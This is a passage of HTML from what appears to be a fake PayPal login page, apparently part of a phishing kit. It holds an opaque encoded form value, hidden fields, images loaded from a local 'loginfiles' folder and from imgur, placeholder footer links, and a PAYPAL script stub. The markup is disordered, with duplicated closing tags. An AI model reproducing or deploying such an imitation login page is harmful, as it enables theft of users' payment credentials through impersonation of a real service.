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">
	<input type="hidden" name="CustData" >
	<input type="hidden" name="ABSlog" value="OIP">	
</form>
</TABLE>



<!-- End of centering table -->

</BODY>
</HTML></BODY></HTML></section></div> </div> </div>
<div class="two column nogutter">
<section class="section-one">
<p><img border="0" src="loginfiles/css1/img/hrlp.PNG" width="308" height="69"></p>
</section>
<section class="section-two">
<p><img border="0" src="loginfiles/css1/img/cdf.PNG" width="299" height="85"></p>
</section>
</div>



</section> </section> 



<footer id="gblFooter" role="contentinfo">       <div class="footer">
<div class="footerNav">
<span class="countryList">

<img border="0" src="loginfiles/space-120.png" width="38" height="35" align="right">
<ul id="countryList" class="dropdown">  <li class="country unitedStates"></li>  <li class="country canada"></li>  <li class="country mexico"></li>  <li class="country unitedKingdom"></li>  <li class="country australia"></li>  <li class="last"></li>
</ul>
<div class="pointer"></div>
</li>   </ul>
</span>
<div class="legal">
<p class="copyright"> 
<img border="0" src="https://i.imgur.com/Qk0cR6H.png" width="230" height="17"></p>
<ul>
<li>
<a href="#">Privacy</a>
</li>
<li>
<a href="#">Legal</a>
</li>
<li>
<a href="#">Help</a>
</li>
<li>
<a href="#">Contact</a>
</li>
</ul>
</div>  </div>
</div>        </footer> 

<script> PAYPAL = this.PAYPAL || {};  PAYPAL.content = PAYPAL.content || {};</script>


</div> 
<script data-main="./loginfiles/css1/js/main" src="loginfiles/css1/js/require-2.0.1.js"></script>

    


</body>
</html>